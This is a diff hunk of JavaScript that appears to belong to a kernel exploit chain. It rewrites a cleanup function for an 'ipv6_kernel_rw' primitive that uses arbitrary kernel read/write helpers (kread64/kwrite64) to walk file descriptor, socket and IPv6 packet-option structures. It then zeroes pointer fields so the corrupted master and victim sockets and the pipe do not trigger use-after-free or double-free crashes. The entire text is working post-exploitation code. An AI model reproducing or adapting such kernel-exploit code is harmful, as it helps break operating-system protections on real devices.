@@ -1797,49 +1797,39 @@
 
         async function cleanup_ipv6_kernel_rw(S) {
             try {
-                const so_pcb_off = S.OFF.SO_PCB || 0x18n;
-                const pktopts_off = S.OFF.INPCB_PKTOPTS || 0x120n;
-
-                const zero_sock_pktopts = (fd, label) => {
-                    if (fd === undefined || fd < 0) return;
-                    try {
-                        const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
-                        if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                        const so = S.kread64(fp);
-                        if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
-                        const pcb = S.kread64(so + so_pcb_off);
-                        if (pcb === 0n || (pcb >> 48n) !== 0xFFFFn) return;
-                        const pktopts = S.kread64(pcb + pktopts_off);
-                        if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
-                        // Zero ALL pointer fields in pktopts to prevent any
-                        // double-free / UAF when the kernel closes the socket.
-                        // ip6po_rthdr in particular is used by ipv6_kernel_rw.
-                        S.kwrite64(pktopts + 0x00n, 0n);                 // ip6po_m
-                        S.kwrite64(pktopts + 0x10n, 0n);                 // ip6po_pktinfo
-                        S.kwrite64(pktopts + 0x18n, 0n);                 // ip6po_nexthop
-                        S.kwrite64(pktopts + S.OFF.IP6PO_RTHDR, 0n);     // ip6po_rthdr
-                        S.kwrite64(pktopts + 0x38n, 0n);                 // ip6po_rthdr2
-                        S.kwrite64(pktopts + 0x40n, 0n);                 // ip6po_dest1
-                        S.kwrite64(pktopts + 0x48n, 0n);                 // ip6po_dest2
-                    } catch (_) { }
-                };
-
                 if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
                     const d = ipv6_kernel_rw.data;
-                    zero_sock_pktopts(d.master_sock, "master_sock");
-                    zero_sock_pktopts(d.victim_sock, "victim_sock");
+                    const so_pcb_off = S.OFF.SO_PCB || 0x18n;
+                    const pktopts_off = S.OFF.INPCB_PKTOPTS || 0x120n;
+
+                    const zero_sock_pktinfo = (fd, label) => {
+                        if (fd === undefined || fd < 0) return;
+                        try {
+                            const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                            if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
+                            const so = S.kread64(fp);
+                            if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
+                            const pcb = S.kread64(so + so_pcb_off);
+                            if (pcb === 0n || (pcb >> 48n) !== 0xFFFFn) return;
+                            const pktopts = S.kread64(pcb + pktopts_off);
+                            if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
+                            S.kwrite64(pktopts + 0x10n, 0n);
+                        } catch (_) { }
+                    };
+
+                    zero_sock_pktinfo(d.master_sock, "master_sock");
+                    zero_sock_pktinfo(d.victim_sock, "victim_sock");
 
                     if (d.pipe_addr !== undefined && d.pipe_addr !== 0n && (d.pipe_addr >> 48n) === 0xFFFFn) {
                         try {
                             S.kwrite64(d.pipe_addr + 0x00n, 0n);
                             S.kwrite64(d.pipe_addr + 0x08n, 0n);
                             S.kwrite64(d.pipe_addr + 0x10n, 0n);
-                            S.kwrite64(d.pipe_addr + 0xD8n, 0n);  // pp_sigio
                         } catch (_) { }
                     }
-                }
 
-                await ulog("cleanup: ipv6_kernel_rw state neutralized");
+                    await ulog("cleanup: ipv6_kernel_rw state neutralized; fds left open");
+                }
             } catch (e) {
                 try { await ulog("cleanup: ipv6_kernel_rw failed: " + e.message); } catch (_) { }
             }
